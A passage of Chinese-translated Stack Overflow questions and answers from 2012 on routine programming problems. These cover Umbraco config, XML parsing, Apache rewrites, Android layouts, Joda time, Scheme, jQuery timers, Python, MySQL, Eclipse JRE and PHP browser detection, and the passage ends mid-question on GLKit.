出于某种原因，umbraco web.config 文件中的连接字符串位于 appSettings 标记下，我想将其移动到 connectionStrings 标记下的正常位置，但这样做会给我一个错误。有什么方法可以移动它，以便我可以为连接字符串使用单独的文件？

现在的连接字符串：

```
<appSettings>
<add key="umbracoDbDSN" value="data source=My-Server\SQLEXPRESS;integrated security=True;persist security info=False;initial catalog=UmbracoWeb" /></appSettings> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-14T10:07:52.203

为什么要移动它？

只需在您的库中引用 umbraco.dll，然后使用：

```
string s = umbraco.GlobalSettings.DbDSN; 
```

否则，我认为您必须下载源代码并进行更改。但是，您必须对每次更新进行修复。

# asp.net - 如何从 XML 文档中提取某些数据

> ID：13328903
> 
> 赞同：0
> 
> 时间：2012-11-11T05:42:43.687
> 
> 标签：asp.net, xml, web-services, xpath, xpathdocument

好的，我会尽量快速和简单地解释这一点......

我想要做的是从 xml 中提取四种不同的东西......首先[是](http://www.webservicex.net/stockquote.asmx/GetQuote?Symbol=T)我正在使用的 XML 的 url，我试图从那个 url XML 中只显示名称（符号）、Last、High和低。

因此，在我的应用程序中，当用户点击按钮获取股票报价时，现在出现的是来自该 XML 的所有内容，但我只想显示上面列出的那 4 件事。

这是我现在的代码...

```
 HttpWebRequest myHttpWebRequest = null;     //Declare an HTTP-specific implementation of the WebRequest class.
     HttpWebResponse myHttpWebResponse = null;   //Declare an HTTP-specific implementation of the WebResponse class
     XmlTextReader myXMLReader = null;           //Declare XMLReader           
     XPathNavigator nav;
     XPathDocument docNav;

     //Create Request
     String stockQuote = "http://www.webservicex.net/stockquote.asmx/GetQuote?Symbol=T" + txtInfo.Text;

     myHttpWebRequest = (HttpWebRequest)HttpWebRequest.Create(stockQuote);
     myHttpWebRequest.Method = "GET";
     myHttpWebRequest.ContentType = "text/xml; encoding='utf-8'";
     //Get Response
     myHttpWebResponse = (HttpWebResponse)myHttpWebRequest.GetResponse();

     //Load response stream into XMLReader
     myXMLReader = new XmlTextReader(myHttpWebResponse.GetResponseStream());

     docNav = new XPathDocument(myXMLReader);
     // Create a navigator to query with XPath.
     nav = docNav.CreateNavigator();

     txtResults.Text = txtResults.Text + nav.Name + " - " + nav.Value + Environment.NewLine; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T06:47:11.083

问题是该服务实际上并没有提供 xml 提要，它只是一些看起来像 xml 的编码数据的 xml 包装器。您必须先对其进行预处理，然后才能使用 xpath 访问其中的任何元素。如果你 xmllint 它，你可以看到这个

```
%xmllint --format 'http://www.webservicex.net/stockquote.asmx/GetQuote?Symbol=T'
<?xml version="1.0" encoding="utf-8"?>
<string xmlns="http://www.webserviceX.NET/">&lt;StockQuotes&gt;&lt;Stock&gt;&lt;Symbol&gt;T&lt;/Symbol&gt;&lt;Last&gt;33.54&lt;/Last&gt;&lt;Date&gt;11/9/2012&lt;/Date&gt;&lt;Time&gt;4:00pm&lt;/Time&gt;&lt;Change&gt;+0.34&lt;/Change&gt;&lt;Open&gt;33.02&lt;/Open&gt;&lt;High&gt;33.72&lt;/High&gt;&lt;Low&gt;32.71&lt;/Low&gt;&lt;Volume&gt;31871880&lt;/Volume&gt;&lt;MktCap&gt;190.5B&lt;/MktCap&gt;&lt;PreviousClose&gt;33.20&lt;/PreviousClose&gt;&lt;PercentageChange&gt;+1.02%&lt;/PercentageChange&gt;&lt;AnnRange&gt;27.41 - 38.58&lt;/AnnRange&gt;&lt;Earns&gt;0.756&lt;/Earns&gt;&lt;P-E&gt;43.92&lt;/P-E&gt;&lt;Name&gt;AT&amp;T Inc.&lt;/Name&gt;&lt;/Stock&gt;&lt;/StockQuotes&gt;</string> 
```

我不是.net 程序员，所以我无法给你一个说明性的答案，但从我所读到的内容[`XmlTextReader`](http://msdn.microsoft.com/en-us/library/system.xml.xmltextreader.aspx)来看，它似乎是为了读取已经是 XML 的数据。但是，该响应中唯一作为 XML 的部分是`<string>`元素，其余部分已被转义，`<`并分别`>`转换为`&lt;`和`&gt;`，这使其只是一堆文本。

在这一点上，我有 15 分钟的 .net 经验，在我看来，您需要将它们转换回来（不确定最佳实践是什么），然后可能会使用类似[`LoadXML`](http://msdn.microsoft.com/en-us/library/system.xml.xmldocument.loadxml.aspx)之前的东西，然后才能实际`XmlTextReader`使用它。请适当调整您接受此建议的盐粒。

或者您可以尝试让提供该服务的人实际发出真正的 xml。

# apache - 将 ^/?([az]{2})/(printers|hdd|scanners|etc) 重写为更简单的东西

> ID：13328907
> 
> 赞同：0
> 
> 时间：2012-11-11T05:43:52.193
> 
> 标签：apache, .htaccess, url-rewriting

我有这个重写规则：

```
RewriteRule ^/?([a-z]{2})/(printers|hdd|scanners|--some 40 more items go here --)/ 
```

注意部分（打印机|硬盘|扫描仪|--这里还有大约 40 个项目--）？那里有大约 40 件物品。有没有更简单的方法来执行此规则，而不是将所有这 40 个项目包括在内？这不仅仅是一个规则，还有很多这样的规则。

我知道我可以执行以下规则，但问题是，如果用户键入[http://www.domain.com/us/foo](http://www.domain.com/us/foo)，它仍然会得到 tru。然而，如果我只包含项目名称，如果找不到名称，则会引发错误。

```
RewriteRule ^/?([a-z]{2})/([a-zA-z0-9\-]+)/?$ 
```

有更简单的方法吗？我们可以像在 php 中那样将值存储在变量中并在 htaccess 页面的其他部分使用该变量吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T08:50:35.650

> 有更简单的方法吗？我们可以像在 php 中那样将值存储在变量中并在 htaccess 页面的其他部分使用该变量吗？

不，如果您不想让所有内容都通过，那么您必须明确列出您想要的所有内容。您可以这样做，也可以使用类似[RewriteMap](http://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritemap)的东西，这需要服务器/虚拟主机配置访问。

# android - Android中的仪表板设计

> ID：13328908
> 
> 赞同：-1
> 
> 时间：2012-11-11T05:43:57.090
> 
> 标签：android, android-layout, android-relativelayout, dashboard

我的应用中有以下仪表板，我想在 Android 中设计。但我无法创建与设计相同的它。

这里是设计...![在此处输入图像描述](../Images/5efed770af83a0c9331a4425bc5f6d19.png)

**注意 - 使用了 6 个按钮，分别命名为一、二、三等。我也有共同的标题，我使用 ViewStub。我已经创建了如下图所示的 320x480 圆形并将其设置为背景图像并相应地放置按钮。这是我使用的方法。**

布局代码：-

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="@drawable/background" >

    <LinearLayout
        android:id="@+id/banner"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_marginBottom="10dip" >

        <ViewStub
            android:id="@+id/vsHeader"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:inflatedId="@+id/headings"
            android:layout="@layout/header" />
    </LinearLayout>

    <RelativeLayout
        android:id="@+id/categories"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_below="@id/banner" >

        <ImageView
            android:id="@+id/logo"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_centerHorizontal="true"
            android:contentDescription="desc"
            android:src="@drawable/logo" />

        <Button
            android:id="@+id/one"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentTop="true"
            android:layout_below="@id/logo"
            android:layout_centerHorizontal="true"
            android:layout_marginTop="100dp"
            android:background="@drawable/truck_button"
            android:onClick="onButtonClicker" />

        <Button
            android:id="@+id/two"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentRight="true"
            android:layout_alignParentTop="true"
            android:layout_marginRight="20dp"
            android:layout_marginTop="150dp"
            android:background="@drawable/two"
            android:onClick="onButtonClicker" />

        <Button
            android:id="@+id/three"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignLeft="@+id/two"
            android:layout_below="@+id/two"
            android:layout_marginTop="15dp"
            android:background="@drawable/tire_button"
            android:onClick="onButtonClicker" />

        <Button
            android:id="@+id/four"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignBaseline="@+id/two"
            android:layout_alignBottom="@+id/two"
            android:layout_marginLeft="25dip"
            android:layout_marginRight="14dp"
            android:background="@drawable/tow_truck_button"
            android:onClick="onButtonClicker" />

        <Button
            android:id="@+id/five"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignBaseline="@+id/three"
            android:layout_alignBottom="@+id/three"
            android:layout_alignParentLeft="true"
            android:layout_marginLeft="25dip"
            android:background="@drawable/trailer_button"
            android:onClick="onButtonClicker" />

        <Button
            android:id="@+id/six"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignLeft="@+id/one"
            android:layout_below="@+id/five"
            android:background="@drawable/six"
            android:onClick="onButtonClicker" />
    </RelativeLayout>

</RelativeLayout> 
```

**如果有人对此有任何想法，请帮助或提供您的宝贵建议。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:48:34.190

最简单的方法是创建您自己的`CustomView`并跟踪点击`onTouch`，否则您：

1.  在 UI 上准备不同的片段 - 至少 4-6
2.  使用相对布局对齐它们
3.  有他们单独的背景属性，你在尝试不同的分辨率时想要扩展它。

# java - Java：获取时间间隔

> ID：13328912
> 
> 赞同：2
> 
> 时间：2012-11-11T05:46:58.800
> 
> 标签：java, swing, date, date-format

我正在进行一个以 hh:mm 为单位捕获间隔时间的项目。我有 2 个名为 btnTimeOut 和 btnTimeIn 的按钮，它们都在单击时捕获系统时间。要求是在 hh:mm 等 12:30 - 10:00 = 02:30 (hh:mm) 中获取 btnTimeOut 和 btnTime 之间的间隔。

目前我使用以下代码作为间隔，但它以分钟等形式返回。12:30 - 10:00 = 150 分钟。

```
 String timeOut = lblTimeOut.getText();
  String timeIn = lblTimeIn2.getText();

  SimpleDateFormat format = new SimpleDateFormat("hh:mm");

  Date d1 = null;
  Date d2 = null;

  try {
      d1 = format.parse(timeOut);
      d2 = format.parse(timeIn);
  } 
  catch (Exception e){
      e.printStackTrace();
  }

  long diff = d2.getTime() - d1.getTime();
  long diffMinutes = diff / (60 * 1000);         
  long diffHours = diff / (60 * 60 * 1000);  

  lblSurface.setText(String.valueOf(diffMinutes)); 
```

如何获取表单中的持续时间`hh:mm`？

我使用了 Joda 时间并以无效格式返回：“12:19”在“:19”处格式错误。至于我的其他触发显示时间的按钮。

```
DateFormat timeFormat = new SimpleDateFormat("hh:mm");
Date date = new Date();  
String time = timeFormat.format(date);  
lblTimeIn2.setText(time);

Timer timer = new Timer(1000, timerListener);  
    // to make sure it doesn't wait one second at the start  
timer.setInitialDelay(0);  
timer.start();   
} 
```

我不知道出了什么问题，我是否也需要使用 joda time 来显示其他标签的时间？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T06:56:17.740

我个人会使用[JodaTime](http://joda-time.sourceforge.net/)，因为它考虑到了天数之间的差异（即 23:30-02:30 之间的差异）并且有很好的内置格式化程序

```
public class TestJodaTime {

    public static void main(String[] args) {

        DateTime start = new DateTime(2012, 11, 11, 23, 30, 0, 0);
        DateTime end = new DateTime(2012, 11, 12, 1, 30, 0, 0);
        Interval interval = new Interval(start, end);
        Period toPeriod = interval.toPeriod();

        PeriodFormatter dateFormat = new PeriodFormatterBuilder()
                        .printZeroAlways().minimumPrintedDigits(2)
            .appendHours().minimumPrintedDigits(2)
            .appendSeparator(":")
            .appendMinutes().minimumPrintedDigits(2)
            .toFormatter();        
        System.out.println(toPeriod.toString(dateFormat));
    }
} 
```

哪个会输出`02:00`

**扩展示例**

![在此处输入图像描述](../Images/5b967b43db7f2bf41af3899817418e55.png)

```
public class TestJodaTime {

    public static void main(String[] args) {
        new TestJodaTime();
    }

    public TestJodaTime() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException ex) {
                } catch (InstantiationException ex) {
                } catch (IllegalAccessException ex) {
                } catch (UnsupportedLookAndFeelException ex) {
                }

                JFrame frame = new JFrame("Test");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setLayout(new BorderLayout());
                frame.add(new JodaPane());
                frame.pack();
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }

        });
    }

    public class JodaPane extends JPanel {

        private JTextField startHour;
        private JTextField startMin;
        private JTextField endHour;
        private JTextField endMin;
        private JButton diffButton;
        private JLabel lblDiff;
        private JButton markStart;
        private JButton markEnd;
        private Timer timer;
        private JLabel realTime;

        public JodaPane() {

            markStart = new JButton("Mark");
            markEnd = new JButton("Mark");

            startHour = new JTextField(2);
            startMin = new JTextField(2);
            endHour = new JTextField(2);
            endMin = new JTextField(2);
            diffButton = new JButton("=");
            lblDiff = new JLabel("00:00");
            realTime = new JLabel("00:00.00");

            setLayout(new GridBagLayout());
            GridBagConstraints gbc = new GridBagConstraints();
            gbc.gridx = 0;
            gbc.gridy = 0;
            gbc.anchor = GridBagConstraints.WEST;
            add(new JLabel("From"), gbc);
            gbc.gridx++;
            add(startHour, gbc);
            gbc.gridx++;
            add(new JLabel(":"), gbc);
            gbc.gridx++;
            add(startMin, gbc);
            gbc.gridx++;
            add(markStart, gbc);
            gbc.gridx++;
            add(new JLabel(" to "), gbc);
            gbc.gridx++;
            add(endHour, gbc);
            gbc.gridx++;
            add(new JLabel(":"), gbc);
            gbc.gridx++;
            add(endMin, gbc);
            gbc.gridx++;
            add(markEnd, gbc);
            gbc.gridx++;
            add(diffButton, gbc);
            gbc.gridx++;
            add(lblDiff, gbc);

            gbc.gridy++;
            add(realTime, gbc);

            diffButton.addActionListener(new ActionListener() {
                public boolean isValid(JTextField field) {
                    return field.getText() != null && field.getText().length() > 0;
                }
                @Override
                public void actionPerformed(ActionEvent ae) {
                    if (isValid(startHour) && isValid(startMin)
                                    && isValid(endHour) && isValid(endMin)) {
                        int hourStart = Integer.parseInt(startHour.getText());
                        int minStart = Integer.parseInt(startMin.getText());
                        int hourEnd = Integer.parseInt(endHour.getText());
                        int minEnd = Integer.parseInt(endMin.getText());

                        String prefix = "";
                        if (hourEnd < hourStart) {
                            int tmp = hourStart;
                            hourStart = hourEnd;
                            hourEnd = tmp;
                            prefix = "-";
                        }

                        System.out.println("Start = " + hourStart + ":" + minStart);
                        System.out.println("End = " + hourEnd + ":" + minEnd);

                        DateTime start = new DateTime(0, 1, 1, hourStart, minStart, 0, 0);
                        DateTime end = new DateTime(0, 1, 1, hourEnd, minEnd, 0, 0);
                        Interval interval = new Interval(start, end);
                        Period toPeriod = interval.toPeriod();

                        PeriodFormatter dateFormat = new PeriodFormatterBuilder()
                                        .printZeroAlways().minimumPrintedDigits(2)
                                        .appendHours().minimumPrintedDigits(2)
                                        .appendSeparator(":")
                                        .appendMinutes().minimumPrintedDigits(2)
                                        .toFormatter();
                        lblDiff.setText(prefix + dateFormat.print(toPeriod));
                    }
                }

            });

            markStart.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent ae) {
                    Calendar cal = Calendar.getInstance();
                    startHour.setText(Integer.toString(cal.get(Calendar.HOUR_OF_DAY)));
                    startMin.setText(Integer.toString(cal.get(Calendar.MINUTE)));
                    diffButton.doClick();
                }

            });
            markEnd.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent ae) {
                    Calendar cal = Calendar.getInstance();
                    endHour.setText(Integer.toString(cal.get(Calendar.HOUR_OF_DAY)));
                    endMin.setText(Integer.toString(cal.get(Calendar.MINUTE)));
                    diffButton.doClick();
                }

            });

            timer = new Timer(500, new ActionListener() {
                private SimpleDateFormat sdf = new SimpleDateFormat("HH:mm.ss");
                @Override
                public void actionPerformed(ActionEvent ae) {
                    realTime.setText(sdf.format(new Date()));
                }
            });
            timer.setRepeats(true);
            timer.setCoalesce(true);
            timer.start();

        }

    }

} 
```

你的问题有点模糊，所以我做了一个广泛的例子。马克，基本上自动用当前时间填充字段。

几乎没有验证;)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T05:49:28.837

**当你得到分钟时，它也包括小时。**只需将分钟除以`60`得到小时，然后用除法的余数更新分钟，如下所示。

```
 long diffMinutes = diff / (60 * 1000);  //difference in minutes       
    long diffHours = (long) diffMinutes/60; //get hours from diff minutes
    diffMinutes  = diffMinutes % 60; //remainder of minutes after converting hours 
```

最后在文本中设置小时和分钟：

```
 lblSurface.setText(diffHours + ":" + diffMinutes); 
```

由于`":"`附加在两者之间，由于隐式转换应该没问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-11T05:57:26.013

```
String.format("%1d:%2d", mins/60, (mins%60)) 
```

## 例如

```
public class HoursMinutesFormat {

    public static void main(String[] args) {
        int mins = 150;
        System.out.println(String.format("%1d:%2d", mins/60, (mins%60)));
    }
} 
```

输出

```
2:30 
```

# recursion - 方案中的递归

> ID：13328914
> 
> 赞同：0
> 
> 时间：2012-11-11T05:47:10.217
> 
> 标签：recursion, scheme

我的目标是从此列表中找到

`(A B C D E G)`

新清单

`(B D G)`

但是我的代码不起作用。

```
(define  (fun lst)
    (cond
     ((null? lst) '())
      ((null? (cdr lst) '())
       (else  (cons ( cadr lst) ( fun lst)))) 
```

我得到`(B C D E G)`。我哪里出错了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T18:41:25.450

您的函数没有做任何事情，并且您确实没有指定要测试的内容。如果您真的只想从该特定列表中获取 BDG，那么您需要做的就是为每个角色进行这些每个测试，(equal? (car lst) 'B) 等等。

相反，如果该函数假设只打印列表中的所有其他字符，那么您需要构建一种方法来做到这一点。例如，您现在拥有的递归基本情况是正确的，并且空列表应该返回一个空列表。否则，如果它不为空，则返回列表的 cdr，然后使用它。

如果您仍然无法找出答案，请开始将其写在纸上，看看不同的测试会做什么。您需要想出一种方法来找到其他所有角色。

# jquery - 定时器只有 30 分钟

> ID：13328919
> 
> 赞同：-2
> 
> 时间：2012-11-11T05:49:09.963
> 
> 标签：jquery, timer

我想设置一个计时器，例如我的产品在添加到购物车时应该只显示 30 分钟。我试过 ：-

```
var d = new Date();

var minute = d.getHours()+30; 
```

我还想向用户显示还剩多少时间（倒计时）

我知道这是错误的。我想使用 jQuery 来做到这一点。我是 jquery 新手，请帮助我

提前致谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-11T06:08:01.060

> 是的，这有点正确，但我想告诉用户还剩多少时间，即应该开始倒计时。如何做到这一点

好的，这个怎么样：

```
var countdown = 30 * 60 * 1000;
var timerId = setInterval(function(){
  countdown -= 1000;
  var min = Math.floor(countdown / (60 * 1000));
  //var sec = Math.floor(countdown - (min * 60 * 1000));  // wrong
  var sec = Math.floor((countdown - (min * 60 * 1000)) / 1000);  //correct

  if (countdown <= 0) {
     alert("30 min!");
     clearInterval(timerId);
     //doSomething();
  } else {
     $("#countTime").html(min + " : " + sec);
  }

}, 1000); //1000ms. = 1sec. 
```

或者我推荐你使用这些插件： [http ://www.tripwiremagazine.com/2012/09/jquery-countdown-scripts.html](http://www.tripwiremagazine.com/2012/09/jquery-countdown-scripts.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-11T05:52:43.107

您可以在[此处](http://www.w3schools.com/js/js_timing.asp)查看 javascript 计时器。如果需要计时 30 分钟，请尝试

```
var timer = window.setInterval(function()
{
    //doSomething
}, 1800000); 
```

编辑

为了防止它稍后再次关闭，请使用`window.clearInterval(timer);`

编辑

如果您愿意，您可以跟踪过去了多少时间，而不是拥有一个大计时器。

```
var startTime = (new Date()).getTime();
var secondsLeft;
var timer = window.setInterval(function()
{
    var now = (new Date()).getTime();
    secondsLeft = 1800 - ((now - startTime) / 1000);
    //do something here to display secondsLeft
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-11T05:59:09.223

如果你想用 Javascript 来做，你可以这样做：

```
var waitTime = 30 * 60 * 1000; // = 30min.

setTimeout(function(){
  alert("30 min!");
}, waitTime); 
```

如果你想使用 jQuery，你可以使用 jQuery Timer 插件。 [http://jquery.offput.ca/every/](http://jquery.offput.ca/every/)

但我认为如果你使用 PHP 并且系统是购物车（或其他东西），也许你应该使用 PHP 的会话机制来做到这一点。

# ios - MPL 示例应用程序

> ID：13328927
> 
> 赞同：0
> 
> 时间：2012-11-11T05:50:29.530
> 
> 标签：ios, paypal, sample

我正在尝试将 paypal 集成到我的 iOS 应用程序中以销售实物商品，但很难找到使用 MPL 支付的示例应用程序。到目前为止，我一直在关注“https://www.x.com/developers/paypal/how-to-guides/how-accept-payments-ios-app-using-mpl”，但对于以下事实感到非常困惑它没有提供完整的请求格式。我创建了 2 个帐户 - 一个付款的帐户和另一个 api 调用者帐户。我真的很震惊如何继续前进。

任何帮助将不胜感激。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T17:29:52.800

这些示例是 MPL zip 文件中的捆绑包，您可能已经从此处下载：[PayPal SDK Index](https://www.x.com/developers/paypal/documentation-tools/paypal-sdk-index?qt-paypal_sdk_index=2#qt-paypal_sdk_index)。解压缩文件后，您将找到一个带有工作代码的 SimpleDemo。查看“FourButtonViewController.m”了解更多详情。

# python - python：将文件转换为字符串列表

> ID：13328928
> 
> 赞同：0
> 
> 时间：2012-11-11T05:50:43.337
> 
> 标签：python

一个文件包含如下信息我想将此文件转换为字符串列表列表组之间有一个空行。

```
pear
banana

milk
tea
coffee 
```

结果返回：

```
build_list(f):
[[pear, banana], [milk, tea, coffee]] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T06:13:44.647

这应该这样做：

```
with open("data.txt") as f:
    res = [line.split('\n') for line in f.read().split('\n\n')] 
```

将输入数据分成几组，然后将每组分成几行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T10:09:12.350

Stack_13328928.txt 是您的列表。请注意，输入文件中的最后一行必须是新行，否则最后一项会丢失，但我认为可以修改代码，您不需要一个空白的新行。

```
import csv
in_file = open("stack_13328928.txt")
CSV = csv.reader(in_file)
outer_ls = []
inter_ls = []
for i in CSV:
    try:
        i[0]
        inter_ls += i
    except:
        outer_ls.append(inter_ls)
        inter_ls = []

print outer_ls 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T06:07:40.820

尝试这个：

```
from itertools import groupby

def build_list(name):
    with open(name, "r") as f:
        return [[i.strip() for i in group] for key, group in
                groupby(f, key=lambda k: (k.strip() == "")) if not key] 
```

此解决方案甚至允许在组之间有多个空行或末尾有多个空行的退化文件。

# android - 如何获取活动堆栈的大小？

> ID：13328929
> 
> 赞同：0
> 
> 时间：2012-11-11T05:51:06.050
> 
> 标签：android, android-activity

我想获取活动堆栈的当前大小以进行调试，有什么办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:57:25.663

没有办法从设备上做到这一点（我知道），但如果是为了调试`dumpsys activity`，你总是可以从 adb shell 调用它，或者，在命令行中一次性调用，只是`adb shell dumpsys activity`

# python - 将列表数据附加到 txt

> ID：13328930
> 
> 赞同：0
> 
> 时间：2012-11-11T05:51:20.417
> 
> 标签：python

我的目标是将列表“lis”中的所有值附加到“txt”，我在下面粘贴一个片段，我总是看到只有最后一个元素附加到“txt”，我该如何解决？我尝试使用 txt + = 但这也行不通，因为我希望列表数据“lis”位于“txt[0:tagEnd]”和“wikiText + txt[endTag:len(txt)]”之间

```
for i in range(len(lis)) :
    txt = txt[0:tagEnd] + lis[i] + wikiText + txt[endTag:len(txt)] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:58:17.360

为什么不从列表中创建一个字符串并附加它呢？

```
for i in range(len(lis)):
  all_strings += " " + lis[i]

txt = txt[0:tagEnd] + all_strings + wikiText + txt[endTag:len(txt)] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T06:05:38.280

如果我理解正确，您可以这样做：

```
txt = txt[:tagEnd] + ' '.join(lis) + wikiText + txt[endTag:] 
```

# mysql - MySQL多列最大顺序运行

> ID：13328931
> 
> 赞同：1
> 
> 时间：2012-11-11T05:51:21.447
> 
> 标签：mysql, multiple-columns, sequential

几天来，我一直在努力尝试为以下问题编写查询（MySQL 的新手）。

我有一个表 A，其中包含以下数据

```
id, r1, r2, r3, r4, r5, r6, r7, r8, r9, max
 1,  1,  2,  3,  6,  7,  8,  9,  0
 2,  1,  3,  4,  5,  6,  7,  8,  0
 3,  2,  4,  5,  7,  9, 11, 12,  0 
```

我需要将最大字段设置为行中的最大序列。例如，第 1 行的最大序列为 4 (6,7,8,9)，因此最大字段将显示 4。数字始终在行中从小到大（从左到右）列出。

我怀疑这将是类似的东西；

```
SET @r:=0
SET @s:=0

IF(r1 + 1 = r2, IF(@r > @s, @s:=@r, @r:= @r + 1),
IF(r2 + 1 = r3, IF(@r > @s, @s:=@r, @r:= @r + 1),
IF(r3 + 1 = r4, IF(@r > @s, @s:=@r, @r:= @r + 1),
IF(r4 + 1 = r5, IF(@r > @s, @s:=@r, @r:= @r + 1),` 
```

等等......但它似乎不起作用，因为增量只适用于每行？

```
FOR i <= count(column)
IF count > sequence 
THEN sequence = count
ELSE count ++
NEXT i 
```

任何帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T07:39:07.780

您可能完全可以在 MySQL 中执行此操作，但我认为这会相当混乱。

如果我是你，我会在客户端上这样做。这应该作为 Perl 实现工作：

```
use DBI;
my $dbh = DBI->connect("dbi:mysql", "user", "password");
my $sth = $dbh->prepare("SELECT * FROM mytable");
$sth->execute();
while (my $row = $sth->fetchrow_hashref()) {
    my $id = $row->{id};
    my @r;
    push @r, $row->{r1}, $row->{r2}, $row->{r3},
             $row->{r4}, $row->{r5}, $row->{r6},
             $row->{r7}, $row->{r8}, $row->{r9};
    my $max = 1; # max run
    my $t = 1;   # local max run
    for (my $i = 1; $i < 9; $i++) {
        if ($r[$i] == $r[$i-1]+1) {
            $t++;
        } else {
            $t = 1;
        }
        if ($t > $max) {
            $max = $t;
        }
    }
    $dbh->do(qq{ UPDATE mytable SET max = ? WHERE id = ?}, undef,
                                   $max,         $id);
}
$sth->finish();
$dbh->disconnect(); 
```

# java - Eclipse 运行项目错误 - java hotpot(TM) 64-bit server VM -1.7.0_09 <> 1.5.0

> ID：13328933
> 
> 赞同：1
> 
> 时间：2012-11-11T05:51:39.053
> 
> 标签：java, java-7, eclipse-indigo, jdk1.6

我运行了一个项目，一个名为 Adempiere 的开源项目。这是一个开源 ERP 系统，我有兴趣使用这个 ERP。我得到了源代码，在 Eclipse Indigo 中使用 SVN 下载了它。

我运行了这个项目，出现了一个错误，说**javahotspot(TM) 64 位服务器 VM -1.7.0_09 <> 1.5.0**这有什么问题？为什么会出现这个错误？我在我的系统中安装了 64 位的 1.6 和 7 JDK。

外面有没有安德米亚人？他们的论坛最近不太友好。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:08:03.077

安装 jdk 5 然后

窗口 -> 首选项 -> 已安装的 JRE

然后回到你的项目

项目 -> 属性 -> Java 构建路径 -> 库

删除 1.7 系统库，然后：添加库... -> JRE 系统库 -> 备用 JRE -> 您想要的 JRE。在这种情况下，它必须是 1.5。

# php - 用 PHP 检查 IE 是不是很糟糕

> ID：13328934
> 
> 赞同：3
> 
> 时间：2012-11-11T05:51:42.127
> 
> 标签：php, internet-explorer, if-statement

我正在开发的 wordpress 主题中设置 IE 检查。我想检查 Internet Explorer 7。所以如果我使用以下代码：

```
<?php
if (preg_match('/\bmsie 7/i', $ua) && !preg_match('/\bopera/i', $ua))
echo 'Do Something' 
?> 
```

代替：

```
<!--[if lt IE 7]>
Do Something
<![endif]--> 
```

它有什么缺点吗？仅在需要时才尝试加载 HTML。任何见解都值得赞赏。

编辑

发现这篇关于 PHP 方式的非常好的文章：[http ://www.kingofdevelopers.com/php-classes/get-browser-name-version.php](http://www.kingofdevelopers.com/php-classes/get-browser-name-version.php)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T05:56:33.517

尝试检测涵盖许多可能的浏览器的平台、引擎和版本，然后让我在此基础上编写代码，例如引擎 gecko，涵盖 firefox、seamonkey 和所有基于 gecko 的浏览器。

在 php 中使用

```
$browser = get_browser(null, true);
print_r($browser); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T05:57:55.517

两者都是对的。第二种方式是客户端，如果您使用一些常见的活动，例如 - 包括 SVG 特定元素、IE 特定样式表等，这将是有益的，您将减少服务器端处理。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T06:06:13.533

我同意 user1759084，他们都是“正确的”，但我要补充一点，这取决于您交付的 HTML 数量。如果数量很大，则在服务器上进行检查（php 检查）更有意义，如果只是几行，则最好让客户端决定（HTML 条件）。您确实应该使用功能检测而不是浏览器检测，但在某些情况下它不起作用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-11T06:27:38.690

你可以使用这个类的php。那是准确检测到 [http://www.phpclasses.org/package/2525-PHP-Detect-the-browser-type-and-capabilities-category.html](http://www.phpclasses.org/package/2525-PHP-Detect-the-browser-type-and-capabilities-category.html)

# objective-c - 使用 GLKit 检测 -glkView:drawInRect: 中的 -snapshot 调用

> ID：13328939
> 
> 赞同：0
> 
> 时间：2012-11-11T05:53:01.390
> 
> 标签：objective-c, ios, opengl-es, opengl-es-2.0, glkit

我正在寻找是否`-glkView:drawInRect:`可以检测到它正在绘制`-snapshot`方法，而不是正常的方式，视图将显示给用户。这样我就可以检测到如何正确绘制视图。我检测视图差异的尝试是将传递给`-glkView:drawInRect:`的视图与 GLKViewController 的视图进行比较：

```
// standard function GLKViewController
